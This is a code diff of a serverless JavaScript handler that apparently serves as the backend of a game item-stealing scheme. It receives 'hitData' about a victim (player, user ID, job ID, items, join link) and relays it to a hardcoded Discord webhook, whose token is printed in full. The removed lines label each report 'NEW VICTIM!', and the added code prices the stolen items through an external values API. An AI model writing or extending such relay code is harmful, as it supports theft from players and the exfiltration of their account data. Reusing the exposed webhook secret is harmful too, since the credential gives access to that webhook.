@@ -1,5 +1,4 @@
 export default async function handler(req, res) {
-    // Enable CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -11,46 +10,31 @@ export default async function handler(req, res) {
     // Your Discord webhook
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
     
+    // Fetch values from your getvalues.js API
+    let itemValues = {};
     try {
-        let data = req.body;
-        
-        // If it's wrapped in { hitData: ... }
-        if (data && data.hitData) {
-            const { player, userId, jobId, items, joinLink } = data.hitData;
-            
-            // Build items list
-            let itemsText = "";
-            for (const item of items || []) {
-                itemsText += `• ${item.name} x${item.amount}\n`;
-            }
-            if (itemsText === "") itemsText = "No items";
-            
-            const message = `**🎯 NEW VICTIM!**
-
-**Player:** ${player}
-**User ID:** ${userId}
-**Job ID:** \`${jobId}\`
-
-**Items:**
-${itemsText}
-
-**Join Link:** ${joinLink}`;
-            
-            data = { content: message, username: "Ripples" };
+        const valuesResponse = await fetch('https://my-api-dusky-three.vercel.app/api/getvalues.js');
+        if (valuesResponse.ok) {
+            itemValues = await valuesResponse.json();
+            console.log('✅ Loaded values from API');
         }
-        
-        const response = await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-        
-        return res.status(200).json({ success: true, status: response.status });
     } catch (error) {
-        console.error('Proxy error:', error);
-        return res.status(500).json({ error: 'Failed to send webhook' });
+        console.error('Failed to fetch values:', error);
     }
-}            // Forward regular message
+    
+    const getValue = (name) => {
+        if (itemValues[name]) return itemValues[name];
+        if (itemValues[name.replace(/^[Cc]hroma /, '')]) return itemValues[name.replace(/^[Cc]hroma /, '')];
+        if (name && name.includes("Chroma")) return 1000;
+        if (name && (name.includes("Celestial") || name.includes("Ice"))) return 100;
+        return 1;
+    };
+    
+    try {
+        const { hitData } = req.body;
+        
+        if (!hitData) {
+            // Forward regular message
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -135,4 +119,4 @@ ${itemsText}
         console.error('Proxy error:', error);
         return res.status(500).json({ error: 'Failed' });
     }
-                    }
+}
